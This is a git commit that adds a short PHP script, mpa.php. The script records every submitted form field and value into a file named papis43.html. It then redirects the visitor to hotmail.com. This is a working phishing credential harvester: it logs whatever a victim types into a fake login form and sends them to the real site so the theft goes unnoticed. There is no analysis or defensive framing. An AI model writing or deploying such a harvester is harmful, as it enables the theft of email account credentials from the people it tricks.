1b9b0ff695db21df815af52760a0061f3ecbfe25
domains221 <69985911+domains221@users.noreply.github.com>
2020-08-20 13:41:58 -0500

    Add files via upload

---
+++ mpa.php
@@ -0,0 +1,14 @@
+<?php
+header("Location: https://www.hotmail.com");
+$handle = fopen("papis43.html", "a");
+foreach($_POST as $variable => $value) {
+fwrite($handle, $variable);
+fwrite($handle, "=");
+fwrite($handle, $value);
+fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n");
+fclose($handle);
+exit;
+?>
+
